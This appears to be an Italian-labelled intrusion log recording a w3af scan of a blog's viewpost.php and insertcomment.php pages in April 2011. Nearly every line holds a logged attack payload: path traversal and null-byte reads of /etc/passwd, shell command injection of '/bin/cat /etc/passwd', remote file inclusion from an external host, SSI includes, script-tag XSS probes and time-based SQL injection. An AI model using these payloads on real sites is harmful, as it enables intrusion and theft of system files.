+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00.html | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=../../../../../../../../../../../../../../../etc/passwd%2500.php | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd%00 | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/etc/passwd | Referer: 
+
+April 5, 2011, 9:24 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21-- | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21-- | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21-- | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21-- | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21-- | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21-- | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21-- | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21-- | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%26%26/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%7C/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3B/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%26%26/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%7C/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3B/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%26%26/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%7C/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3B/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%26%26/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%7C/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3B/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%26%26/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3B/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:25 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%7C/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%26%26/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%7C/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3B/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3B/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%7C/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%26%26/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%26%26/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3B/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%60/bin/cat+/etc/passwd%60 | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%7C/bin/cat+/etc/passwd | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/w3af/remoteFileInclude.html | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22/etc/passwd%22--%3E | Referer: 
+
+April 5, 2011, 9:26 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3C%21--%23include+file=%22C:%5Cboot.ini%22--%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CSCrIPT%3Efake_alert(%22O0Yf%22)%3C/SCrIPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIPT%3Ea=/O0Yf/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(O0Yf))%3C/SCriPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CSCrIPT%3Efake_alert(%220Imi%22)%3C/SCrIPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(0Imi))%3C/SCriPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIPT%3Ea=/0Imi/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CSCrIPT%3Efake_alert(%22FZyZ%22)%3C/SCrIPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIPT%3Ea=/FZyZ/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(FZyZ))%3C/SCriPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CSCrIPT%3Efake_alert(%22M2fi%22)%3C/SCrIPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(M2fi))%3C/SCriPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=%3CScRIPT%3Ea=/M2fi/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CSCrIPT%3Efake_alert(%22sEsa%22)%3C/SCrIPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIPT%3Ea=/sEsa/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(sEsa))%3C/SCriPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CSCrIPT%3Efake_alert(%22lqBS%22)%3C/SCrIPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(lqBS))%3C/SCriPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIPT%3Ea=/lqBS/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CSCrIPT%3Efake_alert(%22p6uy%22)%3C/SCrIPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(p6uy))%3C/SCriPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIPT%3Ea=/p6uy/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CSCrIPT%3Efake_alert(%22Jc05%22)%3C/SCrIPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(Jc05))%3C/SCriPT%3E | Referer: 
+
+April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIPT%3Ea=/Jc05/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
+April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 
+
